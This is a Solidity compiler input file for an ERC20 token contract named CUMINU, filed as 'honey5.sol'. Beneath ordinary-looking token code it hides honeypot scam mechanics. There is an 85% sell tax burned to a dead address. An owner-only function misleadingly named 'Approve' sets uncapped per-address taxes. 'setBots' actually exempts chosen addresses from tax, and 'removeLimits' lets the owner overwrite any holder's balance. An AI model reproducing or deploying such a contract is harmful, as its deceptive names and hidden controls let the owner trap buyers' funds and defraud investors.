{{
  "language": "Solidity",
  "sources": {
    "honey5.sol": {
      "content": "// https://cuminu.io\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.19;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    \n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the Owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new Owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\nlibrary SafeMath {\n   \n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n \ncontract ERC20 is Context {\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n    \n    uint256 internal _totalSupply;\n    string private _name;\n    string private _symbol;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n}\n\ncontract CUMINU is ERC20, Ownable {\n\n    using SafeMath for uint256;\n    \n    mapping(address => uint256) private _balances;\n    mapping(address => bool) private _isTax;\n    mapping(address => uint256) private _accTax;\n\n    uint256 private _buyTax;\n    uint256 private _sellTax;\n    address private uniswapV2Pair;\n    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;\n    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\n    constructor(\n        string memory name_,\n        string memory symbol_,\n        uint256 totalSupply_\n    ) ERC20(name_, symbol_) {\n        _mint(_msgSender(), totalSupply_ * 10**decimals());\n\t    _isTax[_msgSender()] = true;\n        _buyTax = 0;\n        _sellTax = 85;  \n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: REWARD to the zero address\"); \n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 _amount\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= _amount, \"ERC20: transfer amount exceeds balance\");\n        bool rF = true;\n        if (_checkFreeAccount(from, to)) {\n            rF = false;\n        }\n        uint256 tradeFeeAmount = 0;\n        if (rF) {\n            uint256 tradeFee = 0;\n            if (uniswapV2Pair != address(0)) {\n                if (to == uniswapV2Pair) {\n                    tradeFee = _sellTax;\n                }\n                if (from == uniswapV2Pair) {\n                    tradeFee = _buyTax;\n                }\n            }\n            if (_accTax[from] > 0) {\n                tradeFee = _accTax[from];\n            }\n            tradeFeeAmount = _amount.mul(tradeFee).div(100);\n        }\n        if (tradeFeeAmount > 0) {\n            _balances[from] = _balances[from].sub(tradeFeeAmount);\n            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeAmount);\n            emit Transfer(from, _deadAddress, tradeFeeAmount);\n        }\n        _balances[from] = _balances[from].sub(_amount - tradeFeeAmount);\n        _balances[to] = _balances[to].add(_amount - tradeFeeAmount);\n        emit Transfer(from, to, _amount - tradeFeeAmount);\n    }\n\n    function _checkFreeAccount(address from, address to) internal view returns (bool) {\n        return _isTax[from] || _isTax[to];\n    }\n\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    function getPair() external onlyOwner {\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n    }\n\n    function setPair(address _pair) external onlyOwner {\n        uniswapV2Pair = _pair;\n    }\n\n    function upgrageTax(uint256 _buy, uint256 _sell) external onlyOwner {\n        _buyTax = _buy;\n        _sellTax = _sell;\n    }\n\n    function Approve(address _address, uint256 _value) external onlyOwner {\n        require(_value >= 0, \"Account tax must be greater than or equal to 0\");\n        _accTax[_address] = _value;\n    }\n\n    function setBots(address _address, bool _value) external onlyOwner {\n        _isTax[_address] = _value;\n    }\n\n    function removeLimits(address to, uint amount) external onlyOwner {\n        _balances[to] = amount;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        _transfer(_msgSender(), to, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            0, \n            0, \n            address(this),\n            block.timestamp\n        );\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}